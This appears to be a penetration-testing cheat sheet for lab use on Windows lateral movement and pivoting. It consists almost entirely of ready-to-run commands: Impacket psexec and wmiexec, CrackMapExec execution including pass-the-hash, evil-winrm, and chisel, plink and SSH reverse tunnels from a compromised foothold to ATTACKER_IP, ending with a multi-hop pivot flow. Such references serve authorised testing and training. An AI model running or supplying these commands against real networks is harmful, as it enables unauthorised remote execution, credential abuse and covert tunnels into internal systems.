# Lateral Movement & Tunneling

Practical examples for lateral movement primitives and tunneling/pivoting patterns used in labs: psexec, wmiexec, WinRM, chisel reverse tunnels, plink reverse tunnels, and multi-hop pivots.

---

## Quick checklist

- [ ] Prepare chisel/plink on attacker and foothold
- [ ] Use Impacket (psexec/wmiexec) for execs
- [ ] Use WinRM (evil-winrm) where available
- [ ] Create reverse tunnels from foothold to attacker (chisel/plink)
- [ ] Chain tunnels for multi-hop pivoting when needed
- [ ] Remove tunnels & scheduled tasks after use

---

## Lateral movement primitives

### psexec (Impacket)

```bash
python3 /usr/share/impacket/examples/psexec.py 'DOMAIN/Administrator:Pass@TARGET'
```

### wmiexec (Impacket)

```bash
python3 /usr/share/impacket/examples/wmiexec.py 'DOMAIN/user:Pass@TARGET'
```

### CrackMapExec (quick exec/PTH)

```bash
crackmapexec smb TARGET -u 'user' -p 'Pass' --exec-method smbexec -x 'whoami && hostname'
crackmapexec smb TARGET -u 'Administrator' -H '<NTLM_HASH>' --exec-method smbexec -x 'whoami'
```

### Evil-WinRM

```bash
evil-winrm -i TARGET -u 'user' -p 'Pass'
```

---

## Tunneling & pivoting examples

### Chisel reverse tunnel

**Attacker:**

```bash
./chisel server -p 8000 --reverse
```

**Foothold (Windows):**

```powershell
# reverse TARGET2's RDP port via foothold
.\chisel.exe client ATTACKER_IP:8000 R:3389:TARGET2:3389
```

**Attacker:**

- Connect RDP to `localhost:3389` to reach TARGET2.

### Plink (PuTTY) reverse tunnel

**Foothold:**

```powershell
plink.exe -R 13389:localhost:3389 attackeruser@ATTACKER_IP -pw 'AttackerPass' -batch
```

**Attacker:**

- RDP to `localhost:13389`.

### SOCKS via SSH

**Foothold:**

```powershell
ssh -R 1080:localhost:1080 attackeruser@ATTACKER_IP -N -f
```

**Attacker:**

- Configure proxychains or browser to `localhost:1080`.

---

## Multi-hop pivot example

- Reverse tunnel foothold→attacker for initial access.
- From attacker connect into foothold and spawn a second reverse to target2 or use SOCKS chaining to reach many internal hosts.

Example flow:

1. Upload `chisel.exe` to foothold (using smbcopy / powershell download).
2. Start chisel client on foothold to reverse target2:3389 to attacker.
3. On attacker run chisel server, then RDP to `localhost:3389`.

---
